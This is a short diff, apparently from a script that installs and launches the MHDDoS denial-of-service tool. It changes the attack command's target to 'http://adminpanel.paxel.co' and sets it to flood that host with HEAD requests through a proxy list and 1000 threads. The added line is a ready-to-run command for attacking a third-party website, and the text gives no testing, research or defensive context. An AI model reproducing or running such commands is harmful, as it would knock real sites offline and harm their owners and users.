@@ -77,4 +77,4 @@ printf "\r$r$b    Error Occured $endc$enda\n" >&2
 ! cd MHDDoS
 ! pip3 install -r requirements.txt
 ! python3 start.py
-! python3 start.py HEAD https://beta.welovecloudflare.de 1 10000000 proxy.txt 1000 8585
+! python3 start.py HEAD http://adminpanel.paxel.co 1 10000000 proxy.txt 1000 8585
